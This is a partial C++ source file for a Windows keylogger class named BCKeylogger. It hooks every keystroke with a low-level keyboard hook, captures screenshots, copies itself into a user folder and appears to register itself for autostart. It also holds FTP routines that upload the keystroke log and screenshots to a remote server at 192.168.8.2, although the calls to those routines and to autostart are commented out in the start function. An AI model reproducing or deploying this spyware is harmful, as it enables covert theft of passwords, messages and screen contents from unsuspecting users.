...
#pragma comment (lib,"gdiplus.lib")
	...
	BCKeylogger::BCKeylogger(){
		log_error_file = std::fstream ("log_error.txt", std::ios::app);
		s_instance = this;
	};
	
	
	void BCKeylogger::userpath() {
	...
	void BCKeylogger::screenshot(std::string file) {
	...
	void BCKeylogger::ftp_scrshot_send() {
		...
		if (hInternet == NULL) {
			...
			hFtpSession = InternetConnectA(hInternet, "192.168.8.2", 2121, NULL, NULL, INTERNET_SERVICE_FTP, 0, 0);
			...
			if (hFtpSession == NULL) {
				...
				if (!FtpPutFileA(hFtpSession, "core32.mni", "hacks/sc/dc.jpg", FTP_TRANSFER_TYPE_BINARY, 0)) {
					log_error_file << "Error:" << GetLastError();
				}
			}
		}
	...
	void BCKeylogger::ftplogsend() {
		...
		if (hInternet == NULL) {
			...
			if (hFtpSession == NULL) {
				...
				if (!FtpPutFileA(hFtpSession, "log.txt", "hacks/hacks.txt", FTP_TRANSFER_TYPE_BINARY, 0)) {
					log_error_file << "Error:" << GetLastError();
					log_error_file.close();
				}
			}
	...
	void BCKeylogger::AutoCopy() {

		std::string f_path = *userlc;
		std::string f_name = f_path;
		f_name += "\\bckeylogger.exe";//file name
		char my_name[260];
		GetModuleFileNameA(GetModuleHandleA(0), my_name, 260);//name of running process
		std::string f_my = my_name;
		CreateDirectoryA(f_path.c_str(), NULL);
		CopyFileA(f_my.c_str(), f_name.c_str(), FALSE);

	}
	void BCKeylogger::Install() {
		...
		hourS += "H-";
		std::string mintueS = std::to_string(mintue);
		mintueS += "M------------>\n\n";

		std::string startDate = "\n\n";
		startDate += dayS + monthS + yearS + hourS + mintueS;
		char dateCh[260];
		strcpy_s(dateCh, startDate.c_str());


		std::string ff_path = *userlc;
		char szDir[260];
		strcpy_s(szDir, ff_path.c_str());
		strcat_s(szDir, "log.txt");
		FILE* file;
		fopen_s(&file, szDir, "a+");

		fputs(dateCh, file);
		fclose(file);

	}
	int BCKeylogger::isCapsLock()
	{
	...
	LRESULT CALLBACK BCKeylogger::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)	{
	...
	DWORD BCKeylogger::KeyLogger() {
		HHOOK hKeyHook;
		HINSTANCE hExe = GetModuleHandle(NULL);
		if (hExe == NULL) return 1;
		else {
			hKeyHook = SetWindowsHookExA(WH_KEYBOARD_LL, &BCKeylogger::LowLevelKeyboardProc, hExe, 0);
			MSG msg;
	...
	int BCKeylogger::StartKeyLogging()
	{
		HANDLE hThread;
		DWORD dwThread;
	
		std::function<DWORD(void)> fnText = std::bind(&BCKeylogger::KeyLogger, this);
		std::jthread j1(fnText); //std invoke error no matching overloaded functio found

		//hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BCKeylogger::KeyLogger, NULL, 0, NULL);
		if (j1.joinable()) {
			j1.detach();
		}
		else {
	...
	void BCKeylogger::AutoStart()
	{
		char Driver[MAX_PATH];
		HKEY hKey;
		std::string ff_path = *userlc + "bckeylogger.exe";
	...
	void BCKeylogger::KLStart() {
		BCKeylogger::userpath();
		BCKeylogger::AutoCopy();
		// BCKeylogger::AutoStart();
		Sleep(2000);
		BCKeylogger::Install();
		BCKeylogger::screenshot("core32.mni");
		//BCKeylogger::ftp_scrshot_send();
		//BCKeylogger::ftplogsend();
		BCKeylogger::StartKeyLogging();
	}
